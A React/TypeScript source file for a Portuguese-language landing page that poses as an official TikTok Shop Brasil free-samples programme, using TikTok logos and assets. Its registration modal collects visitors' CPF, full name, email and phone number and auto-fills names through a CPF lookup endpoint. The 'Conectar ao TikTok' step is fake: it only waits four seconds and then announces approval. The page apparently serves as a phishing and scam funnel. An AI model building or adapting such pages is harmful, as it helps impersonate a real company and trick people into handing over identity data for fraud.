import { Link, useLocation } from 'wouter';
import { Button } from '@/components/ui/button';
import { ChevronDown, Loader2, X } from 'lucide-react';
import { useState, useEffect, useRef } from 'react';
import tiktokLogo from '@assets/logo-tiktok-CfBkyC_V_(1)_1771528904425.png';

const TIKTOK_SVG = "https://lf16-scmcdn.oecstatic.com/obj/oec-magellan-sg/atlas/account/page/account_register_latam/assets/1.imbqdzf7.svg";
const BANNER_BG = "https://sf16-va.tiktokcdn.com/obj/eden-va2/aubvjjh_ylsslz_thahs/ljhwZthlaukjlkulzlp/register/mobile_main_banner_bg.png";
const TIKTOK_LOGO_ROUND = "https://static.vecteezy.com/system/resources/thumbnails/018/930/574/small/tiktok-logo-tikok-icon-transparent-tikok-app-logo-free-png.png";

const PRODUCT_IMAGES = [
  "https://m.media-amazon.com/images/I/71sGz2Y3byL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/61Lg5RZZFQL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/71xoR4A6q-L._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/51bjAlTBzZL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/51+W7A115SL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/41YmidweMtL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/61BclXmbVtL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/41LpbF-1WDL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/41tgKRWO90L._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/71Exl60wVRL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/61dJPM0QUyL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/71g4snU4xkL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/71CMnwDsoQL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/41bYQcKYVzL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/51gYeCO4zXL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/81dHQklZ1XL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/61NMHA6n0wL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/61DcNovS1yL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/61nXSgxFHeL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/61ZmjmMLsRL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/81hJD-odFeL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/41QHjZtHueL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/71mEwfbHotL._AC_SL500_.jpg",
  "https://images-na.ssl-images-amazon.com/images/I/71HbwGwXAIL._AC_SL500_.jpg",
];

function FAQItem({ question, answer }: { question: string; answer: string }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="border-b border-gray-100 last:border-b-0">
      <button
        onClick={() => setOpen(!open)}
        className="w-full flex items-center justify-between gap-2 py-4 text-left"
        data-testid={`button-faq-${question.slice(0, 20).replace(/\s/g, '-')}`}
      >
        <span className="text-[15px] font-semibold text-black pr-4">{question}</span>
        <ChevronDown className={`w-5 h-5 text-gray-400 flex-shrink-0 transition-transform duration-200 ${open ? 'rotate-180' : ''}`} />
      </button>
      {open && (
        <div className="pb-4 pr-8">
          <p className="text-[15px] text-gray-600 leading-snug">{answer}</p>
        </div>
      )}
    </div>
  );
}

function RegistrationModal({ open, onClose }: { open: boolean; onClose: () => void }) {
  const [step, setStep] = useState(1);
  const [nome, setNome] = useState('');
  const [cpf, setCpf] = useState('');
  const [email, setEmail] = useState('');
  const [telefone, setTelefone] = useState('');
  const [loading, setLoading] = useState(false);
  const [cpfLoading, setCpfLoading] = useState(false);
  const [, navigate] = useLocation();

  useEffect(() => {
    if (open) {
      setStep(1);
      setNome('');
      setCpf('');
      setEmail('');
      setTelefone('');
      setLoading(false);
      setCpfLoading(false);
    }
  }, [open]);

  const lookupCPF = async (rawCpf: string) => {
    if (rawCpf.length !== 11) return;
    setCpfLoading(true);
    try {
      const res = await fetch(`/api/cpf-lookup/${rawCpf}`);
      if (res.ok) {
        const data = await res.json();
        if (data.nome) {
          const formatted = data.nome.split(' ').map((w: string) =>
            w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()
          ).join(' ');
          setNome(formatted);
        }
      }
    } catch {}
    setCpfLoading(false);
  };

  useEffect(() => {
    if (open) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => { document.body.style.overflow = ''; };
  }, [open]);

  const formatCPF = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  };

  const formatPhone = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 11);
    if (digits.length <= 2) return digits;
    if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  };

  const canProceedStep1 = nome.trim() && cpf.replace(/\D/g, '').length === 11 && email.trim() && telefone.replace(/\D/g, '').length >= 10;

  const handleProceedStep1 = () => {
    if (!canProceedStep1) return;
    localStorage.setItem('tiktok_user', JSON.stringify({ nome, cpf, email, telefone }));
    setStep(2);
  };

  const handleConnect = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(3);
    }, 4000);
  };

  const firstName = nome.trim().split(' ')[0] || '';

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-end justify-center" data-testid="modal-registration">
      <div className="absolute inset-0 bg-black/50" onClick={onClose} />
      <div className="relative bg-white w-full max-w-[430px] rounded-t-2xl animate-in slide-in-from-bottom duration-300 max-h-[90vh] overflow-y-auto">
        <div className="sticky top-0 bg-white z-10 flex items-center justify-between px-5 pt-5 pb-3 border-b border-gray-100">
          <div className="w-8" />
          <img src={TIKTOK_LOGO_ROUND} alt="TikTok" className="h-10" />
          <button onClick={onClose} className="w-8 h-8 flex items-center justify-center" data-testid="button-close-modal">
            <X className="w-5 h-5 text-gray-500" />
          </button>
        </div>

        <div className="px-6 py-6">
          {step === 1 && (
            <div data-testid="modal-step-1">
              <h3 className="text-[18px] font-bold text-black text-center mb-2">Cadastre-se no Programa</h3>
              <p className="text-[14px] text-gray-500 text-center mb-6 leading-snug">
                Preencha seus dados para verificar quantas amostras grátis serão liberadas para você
              </p>
              <div className="space-y-4">
                <div>
                  <label className="text-[13px] font-semibold text-gray-700 mb-1.5 block">CPF</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={cpf}
                    onChange={(e) => {
                      const formatted = formatCPF(e.target.value);
                      setCpf(formatted);
                      const raw = formatted.replace(/\D/g, '');
                      if (raw.length === 11) lookupCPF(raw);
                    }}
                    placeholder="000.000.000-00"
                    maxLength={14}
                    className="w-full h-11 px-4 border border-gray-200 rounded-md text-[16px] text-black outline-none focus:border-[#FF2A52] transition-colors"
                    data-testid="input-cpf"
                  />
                </div>
                <div>
                  <label className="text-[13px] font-semibold text-gray-700 mb-1.5 block">Nome completo</label>
                  <div className="relative">
                    <input
                      type="text"
                      value={nome}
                      onChange={(e) => setNome(e.target.value)}
                      placeholder={cpfLoading ? "Buscando..." : "Seu nome completo"}
                      disabled={cpfLoading}
                      className="w-full h-11 px-4 border border-gray-200 rounded-md text-[16px] text-black outline-none focus:border-[#FF2A52] transition-colors disabled:bg-gray-50 disabled:text-gray-400"
                      data-testid="input-nome"
                    />
                    {cpfLoading && (
                      <Loader2 className="w-4 h-4 text-[#FF2A52] animate-spin absolute right-3 top-1/2 -translate-y-1/2" />
                    )}
                  </div>
                </div>
                <div>
                  <label className="text-[13px] font-semibold text-gray-700 mb-1.5 block">E-mail</label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="seu@email.com"
                    className="w-full h-11 px-4 border border-gray-200 rounded-md text-[16px] text-black outline-none focus:border-[#FF2A52] transition-colors"
                    data-testid="input-email"
                  />
                </div>
                <div>
                  <label className="text-[13px] font-semibold text-gray-700 mb-1.5 block">Telefone</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    value={telefone}
                    onChange={(e) => setTelefone(formatPhone(e.target.value))}
                    placeholder="(00) 00000-0000"
                    maxLength={15}
                    className="w-full h-11 px-4 border border-gray-200 rounded-md text-[16px] text-black outline-none focus:border-[#FF2A52] transition-colors"
                    data-testid="input-telefone"
                  />
                </div>
              </div>
              <Button
                onClick={handleProceedStep1}
                disabled={!canProceedStep1}
                className="w-full mt-6 bg-[#FF2A52] border-[#FF2A52] text-white font-bold text-[15px] rounded-md h-12 disabled:opacity-40"
                data-testid="button-prosseguir"
              >
                Prosseguir
              </Button>
            </div>
          )}

          {step === 2 && (
            <div className="text-center" data-testid="modal-step-2">
              {loading ? (
                <div className="py-12">
                  <Loader2 className="w-12 h-12 text-[#FF2A52] animate-spin mx-auto mb-4" />
                  <p className="text-[15px] text-gray-500">Conectando sua conta...</p>
                </div>
              ) : (
                <>
                  <h3 className="text-[18px] font-bold text-black mb-2">Conectar ao TikTok</h3>
                  <p className="text-[15px] text-gray-600 leading-snug mb-8">
                    Clique no botão abaixo para conectar a conta do TikTok no nome de <span className="font-bold text-black">{firstName}</span> vinculada a este dispositivo
                  </p>
                  <Button
                    onClick={handleConnect}
                    className="w-full bg-black border-black text-white font-bold text-[15px] rounded-md h-12"
                    data-testid="button-conectar-tiktok"
                  >
                    Conectar ao TikTok
                  </Button>
                </>
              )}
            </div>
          )}

          {step === 3 && (
            <div className="text-center" data-testid="modal-step-3">
              <div className="text-[40px] mb-3">&#127881;</div>
              <h3 className="text-[20px] font-bold text-black mb-2">Parabéns, {firstName}!</h3>
              <p className="text-[15px] text-gray-600 leading-snug mb-2">
                Você foi <span className="text-[#FF2A52] font-bold">aprovado</span> no programa de amostras grátis do TikTok Shop!
              </p>
              <p className="text-[16px] font-bold text-black mb-6">
                Foram liberadas <span className="text-[#FF2A52]">até 6 amostras grátis</span> para você escolher
              </p>
              <div className="bg-[#F7F8FA] rounded-md p-4 mb-6 text-left">
                <p className="text-[13px] text-gray-600 leading-snug">
                  Ao prosseguir, você concorda em receber os produtos selecionados e gravar um vídeo mostrando cada produto, publicando no TikTok. Não é necessário mostrar o rosto.
                </p>
              </div>
              <Button
                onClick={() => { onClose(); navigate('/'); }}
                className="w-full bg-[#FF2A52] border-[#FF2A52] text-white font-bold text-[15px] rounded-md h-12"
                data-testid="button-acessar"
              >
                Acessar Produtos
              </Button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default function InformativoPage() {
  const [modalOpen, setModalOpen] = useState(false);

  return (
    <div className="min-h-screen bg-white max-w-[430px] mx-auto" data-testid="page-informativo">

      <section className="relative overflow-hidden" data-testid="section-hero">
        <div
          className="bg-black px-6 pt-14 pb-10 text-center relative"
          style={{
            backgroundImage: `url(${BANNER_BG})`,
            backgroundSize: 'cover',
            backgroundPosition: 'center top',
          }}
        >
          <div className="absolute inset-0 bg-black/40"></div>
          <div className="relative z-10">
            <img
              src={tiktokLogo}
              alt="TikTok Shop"
              className="h-8 mx-auto mb-6"
              data-testid="logo-hero"
            />
            <h1 className="text-[22px] font-bold text-white leading-tight mb-3">
              Receba <span className="text-[#FF2A52]">Amostras Grátis</span> do TikTok Shop
            </h1>
            <p className="text-[15px] text-gray-300 leading-snug mb-6 max-w-[300px] mx-auto">
              Escolha produtos, receba em casa gratuitamente e grave um vídeo mostrando sua experiência
            </p>
          </div>
          <div className="relative z-10 mt-4 mb-4 px-2" data-testid="video-embed">
            <div
              ref={(el) => {
                if (el && !el.querySelector('vturb-smartplayer')) {
                  const player = document.createElement('vturb-smartplayer');
                  player.id = 'vid-6997bc781619114c97104eec';
                  player.style.display = 'block';
                  player.style.margin = '0 auto';
                  player.style.width = '100%';
                  player.style.maxWidth = '400px';
                  el.appendChild(player);
                  if (!document.querySelector('script[src*="6997bc781619114c97104eec"]')) {
                    const s = document.createElement('script');
                    s.src = 'https://scripts.converteai.net/cddbdca7-e9aa-4343-a8b3-a0b5552cb55b/players/6997bc781619114c97104eec/v4/player.js';
                    s.async = true;
                    document.head.appendChild(s);
                  }
                }
              }}
            />
          </div>
          <div className="relative mt-2 overflow-hidden -mx-6" data-testid="carousel-products">
            <style>{`
              @keyframes marquee {
                0% { transform: translateX(0); }
                100% { transform: translateX(-50%); }
              }
            `}</style>
            <div
              className="flex gap-2.5"
              style={{
                animation: 'marquee 30s linear infinite',
                width: 'max-content',
              }}
            >
              {[...PRODUCT_IMAGES, ...PRODUCT_IMAGES].map((src, i) => (
                <div
                  key={i}
                  className="relative w-16 h-16 bg-white rounded-md flex-shrink-0 flex items-center justify-center p-1.5"
                >
                  <img
                    src={src}
                    alt=""
                    className="w-full h-full object-contain"
                    loading="lazy"
                  />
                  <span className="absolute bottom-0.5 left-1/2 -translate-x-1/2 bg-[#FF2A52] text-white text-[10px] font-bold px-2.5 py-[4px] rounded-sm leading-none">
                    GRÁTIS
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      <section className="px-5 py-8" data-testid="section-about">
        <div className="flex items-start gap-4 mb-6">
          <img src={TIKTOK_SVG} alt="" className="w-16 h-16 flex-shrink-0" />
          <div>
            <h2 className="text-[16px] font-bold text-black mb-1">O que é o Programa?</h2>
            <p className="text-[15px] text-gray-500 leading-snug">
              O TikTok Shop envia amostras grátis de produtos reais para criadores de conteúdo
            </p>
          </div>
        </div>

        <div className="bg-[#F7F8FA] rounded-md p-5">
          <p className="text-[15px] text-gray-700 leading-snug">
            O programa de amostras grátis do TikTok Shop conecta marcas com criadores de conteúdo. Você recebe os produtos <span className="text-[#FF2A52] font-bold">gratuitamente</span>, sem nenhum custo, e em troca grava um <span className="text-[#FF2A52] font-bold">vídeo curto</span> mostrando o produto. É uma forma simples de conhecer novos produtos e <span className="text-[#FF2A52] font-bold">criar conteúdo</span> para o TikTok.
          </p>
        </div>
      </section>

      <section className="px-5 pb-8" data-testid="section-benefits">
        <h2 className="text-[16px] font-bold text-black mb-5">Benefícios do Programa</h2>

        <div className="space-y-3">
          <div className="flex items-start gap-4 bg-[#F7F8FA] rounded-md p-4">
            <div className="w-10 h-10 bg-gray-100 rounded-md flex items-center justify-center flex-shrink-0">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M20 12V22H4V12" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M22 7H2V12H22V7Z" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M12 22V7" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M12 7H7.5C6.83696 7 6.20107 6.73661 5.73223 6.26777C5.26339 5.79893 5 5.16304 5 4.5C5 3.83696 5.26339 3.20107 5.73223 2.73223C6.20107 2.26339 6.83696 2 7.5 2C11 2 12 7 12 7Z" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M12 7H16.5C17.163 7 17.7989 6.73661 18.2678 6.26777C18.7366 5.79893 19 5.16304 19 4.5C19 3.83696 18.7366 3.20107 18.2678 2.73223C17.7989 2.26339 17.163 2 16.5 2C13 2 12 7 12 7Z" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div>
              <h3 className="text-[15px] font-bold text-black mb-0.5">100% Grátis</h3>
              <p className="text-[15px] text-gray-500 leading-snug">Receba produtos sem pagar nada. Totalmente grátis, sem nenhum custo.</p>
            </div>
          </div>

          <div className="flex items-start gap-4 bg-[#F7F8FA] rounded-md p-4">
            <div className="w-10 h-10 bg-gray-100 rounded-md flex items-center justify-center flex-shrink-0">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M17 21V19C17 17.9391 16.5786 16.9217 15.8284 16.1716C15.0783 15.4214 14.0609 15 13 15H5C3.93913 15 2.92172 15.4214 2.17157 16.1716C1.42143 16.9217 1 17.9391 1 19V21" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M9 11C11.2091 11 13 9.20914 13 7C13 4.79086 11.2091 3 9 3C6.79086 3 5 4.79086 5 7C5 9.20914 6.79086 11 9 11Z" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M23 21V19C22.9993 18.1137 22.7044 17.2528 22.1614 16.5523C21.6184 15.8519 20.8581 15.3516 20 15.13" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M16 3.13C16.8604 3.35031 17.623 3.85071 18.1676 4.55232C18.7122 5.25392 19.0078 6.11683 19.0078 7.005C19.0078 7.89318 18.7122 8.75608 18.1676 9.45769C17.623 10.1593 16.8604 10.6597 16 10.88" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div>
              <h3 className="text-[15px] font-bold text-black mb-0.5">Qualquer Pessoa Pode Participar</h3>
              <p className="text-[15px] text-gray-500 leading-snug">Não precisa de quantidade mínima de seguidores. Aberto para todos.</p>
            </div>
          </div>

          <div className="flex items-start gap-4 bg-[#F7F8FA] rounded-md p-4">
            <div className="w-10 h-10 bg-gray-100 rounded-md flex items-center justify-center flex-shrink-0">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M6 2L3 6V20C3 20.5304 3.21071 21.0391 3.58579 21.4142C3.96086 21.7893 4.46957 22 5 22H19C19.5304 22 20.0391 21.7893 20.4142 21.4142C20.7893 21.0391 21 20.5304 21 20V6L18 2H6Z" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M3 6H21" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M16 10C16 11.0609 15.5786 12.0783 14.8284 12.8284C14.0783 13.5786 13.0609 14 12 14C10.9391 14 9.92172 13.5786 9.17157 12.8284C8.42143 12.0783 8 11.0609 8 10" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div>
              <h3 className="text-[15px] font-bold text-black mb-0.5">Você Escolhe os Produtos</h3>
              <p className="text-[15px] text-gray-500 leading-snug">Navegue pelo catálogo e selecione os produtos que mais te interessam.</p>
            </div>
          </div>

          <div className="flex items-start gap-4 bg-[#F7F8FA] rounded-md p-4">
            <div className="w-10 h-10 bg-gray-100 rounded-md flex items-center justify-center flex-shrink-0">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="3" y="4" width="18" height="18" rx="2" ry="2" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M16 2V6" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M8 2V6" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M3 10H21" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div>
              <h3 className="text-[15px] font-bold text-black mb-0.5">1 Pedido por Semana</h3>
              <p className="text-[15px] text-gray-500 leading-snug">Você pode solicitar novas amostras toda semana. Sem limites de participação.</p>
            </div>
          </div>

          <div className="flex items-start gap-4 bg-[#F7F8FA] rounded-md p-4">
            <div className="w-10 h-10 bg-gray-100 rounded-md flex items-center justify-center flex-shrink-0">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M23 7L16 12L23 17V7Z" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div>
              <h3 className="text-[15px] font-bold text-black mb-0.5">Grave um Vídeo Simples</h3>
              <p className="text-[15px] text-gray-500 leading-snug">Basta gravar um vídeo curto mostrando o produto. Sem roteiro obrigatório.</p>
            </div>
          </div>
        </div>
      </section>

      <section className="bg-[#F7F8FA] px-5 py-8" data-testid="section-steps">
        <div className="flex items-center justify-center gap-2 mb-6">
          <img src="https://lf16-scmcdn.oecstatic.com/obj/oec-magellan-sg/atlas/account/page/account_register_latam/assets/3.gv2u4q1m.svg" alt="" className="h-7" />
          <h2 className="text-[16px] font-bold text-black">Como Funciona</h2>
        </div>

        <div className="space-y-0">
          <div className="flex gap-4">
            <div className="flex flex-col items-center">
              <div className="w-8 h-8 bg-[#FF2A52] rounded-full flex items-center justify-center text-white font-bold text-[13px] flex-shrink-0">1</div>
              <div className="w-0.5 h-full bg-[#FF2A52]/20 min-h-[60px]"></div>
            </div>
            <div className="pb-6">
              <h3 className="text-[15px] font-bold text-black mb-1">Cadastre-se no Programa</h3>
              <p className="text-[15px] text-gray-500 leading-snug">Crie sua conta no TikTok Shop. Qualquer pessoa pode se cadastrar, sem requisitos mínimos.</p>
            </div>
          </div>

          <div className="flex gap-4">
            <div className="flex flex-col items-center">
              <div className="w-8 h-8 bg-[#FF2A52] rounded-full flex items-center justify-center text-white font-bold text-[13px] flex-shrink-0">2</div>
              <div className="w-0.5 h-full bg-[#FF2A52]/20 min-h-[60px]"></div>
            </div>
            <div className="pb-6">
              <h3 className="text-[15px] font-bold text-black mb-1">Escolha seus Produtos</h3>
              <p className="text-[15px] text-gray-500 leading-snug">Navegue pelo catálogo de amostras disponíveis e selecione os que mais te interessam.</p>
            </div>
          </div>

          <div className="flex gap-4">
            <div className="flex flex-col items-center">
              <div className="w-8 h-8 bg-[#FF2A52] rounded-full flex items-center justify-center text-white font-bold text-[13px] flex-shrink-0">3</div>
              <div className="w-0.5 h-full bg-[#FF2A52]/20 min-h-[60px]"></div>
            </div>
            <div className="pb-6">
              <h3 className="text-[15px] font-bold text-black mb-1">Receba em Casa</h3>
              <p className="text-[15px] text-gray-500 leading-snug">O produto é enviado diretamente para seu endereço, com frete totalmente grátis.</p>
            </div>
          </div>

          <div className="flex gap-4">
            <div className="flex flex-col items-center">
              <div className="w-8 h-8 bg-[#FF2A52] rounded-full flex items-center justify-center text-white font-bold text-[13px] flex-shrink-0">4</div>
            </div>
            <div className="pb-2">
              <h3 className="text-[15px] font-bold text-black mb-1">Grave um Vídeo</h3>
              <p className="text-[15px] text-gray-500 leading-snug">Faça um vídeo curto mostrando o produto e compartilhe no TikTok. Simples assim!</p>
            </div>
          </div>
        </div>
      </section>

      <section className="px-5 py-6 text-center">
        <Button
          onClick={() => setModalOpen(true)}
          className="bg-[#FF2A52] border-[#FF2A52] text-white font-bold text-[15px] rounded-md h-12 px-8"
          data-testid="button-ver-produtos-mid"
        >
          Ver Produtos Disponíveis
        </Button>
      </section>

      <section className="bg-[#F7F8FA] px-5 py-8" data-testid="section-rules">
        <h2 className="text-[16px] font-bold text-black mb-5">Regras do Programa</h2>
        <div className="space-y-3">
          <div className="flex items-start gap-3">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M20 6L9 17L4 12" stroke="#25F4EE" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            <p className="text-[15px] text-gray-700">Qualquer pessoa com conta no TikTok pode participar</p>
          </div>
          <div className="flex items-start gap-3">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M20 6L9 17L4 12" stroke="#25F4EE" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            <p className="text-[15px] text-gray-700">Não há quantidade mínima de seguidores exigida</p>
          </div>
          <div className="flex items-start gap-3">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M20 6L9 17L4 12" stroke="#25F4EE" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            <p className="text-[15px] text-gray-700">Você pode fazer 1 pedido de amostra por semana</p>
          </div>
          <div className="flex items-start gap-3">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M20 6L9 17L4 12" stroke="#25F4EE" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            <p className="text-[15px] text-gray-700">Deve gravar um vídeo mostrando o produto recebido</p>
          </div>
          <div className="flex items-start gap-3">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M20 6L9 17L4 12" stroke="#25F4EE" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            <p className="text-[15px] text-gray-700">O vídeo deve ser publicado no TikTok dentro de 7 dias</p>
          </div>
        </div>
      </section>

      <section className="bg-[#F7F8FA] px-5 py-8" data-testid="section-faq">
        <h2 className="text-[16px] font-bold text-black mb-5">Perguntas Frequentes</h2>
        <div className="bg-white rounded-md px-4">
          <FAQItem
            question="Preciso ter muitos seguidores?"
            answer="Não! Qualquer pessoa pode participar do programa, independente do número de seguidores. O programa é aberto para todos os criadores de conteúdo do TikTok."
          />
          <FAQItem
            question="Com que frequência posso pedir amostras?"
            answer="Você pode fazer 1 pedido de amostra por semana. Toda semana você pode escolher novos produtos para receber."
          />
          <FAQItem
            question="Preciso pagar algo?"
            answer="Não! Os produtos e o frete são 100% gratuitos. Você não paga nada para receber as amostras."
          />
          <FAQItem
            question="Que tipo de vídeo preciso gravar?"
            answer="Basta gravar um vídeo curto mostrando o produto que você recebeu. Pode ser um unboxing, review, ou simplesmente mostrando o produto em uso. Não há roteiro obrigatório."
          />
          <FAQItem
            question="Em quanto tempo recebo o produto?"
            answer="O prazo de entrega varia de acordo com sua região, mas geralmente leva de 3 a 10 dias úteis após a confirmação do pedido."
          />
          <FAQItem
            question="Posso escolher qualquer produto?"
            answer="Sim! Você pode navegar pelo catálogo completo e escolher os produtos que mais te interessam dentro das categorias disponíveis."
          />
        </div>
      </section>

      <section className="px-5 py-10" data-testid="section-cta-bottom">
        <div
          className="relative rounded-md p-6 text-center overflow-hidden"
          style={{
            backgroundImage: `url(${BANNER_BG})`,
            backgroundSize: 'cover',
            backgroundPosition: 'center',
          }}
        >
          <div className="absolute inset-0 bg-black/60"></div>
          <div className="relative z-10">
            <h2 className="text-[18px] font-bold text-white mb-2">Comece Agora</h2>
            <p className="text-[15px] text-gray-300 mb-5 leading-snug">
              Escolha seus produtos favoritos e receba amostras grátis diretamente na sua casa
            </p>
            <Button
              onClick={() => setModalOpen(true)}
              className="bg-[#FF2A52] border-[#FF2A52] text-white font-bold text-[15px] rounded-sm"
              data-testid="button-bottom-cta"
            >
              Ver Produtos Disponíveis
            </Button>
          </div>
        </div>
      </section>

      <footer className="bg-black text-white py-8 px-5">
        <div className="text-center">
          <img
            src={tiktokLogo}
            alt="TikTok Shop"
            className="h-6 mx-auto mb-4"
            data-testid="logo-tiktok-footer"
          />
          <p className="text-[11px] text-gray-400 mb-2">
            Programa de Amostras Grátis - TikTok Shop Brasil
          </p>
          <div className="flex justify-center gap-6 flex-wrap text-[11px] text-gray-400">
            <span>Atendimento</span>
            <span>Termos de Uso</span>
            <span>Privacidade</span>
          </div>
        </div>
      </footer>

      <RegistrationModal open={modalOpen} onClose={() => setModalOpen(false)} />
    </div>
  );
}
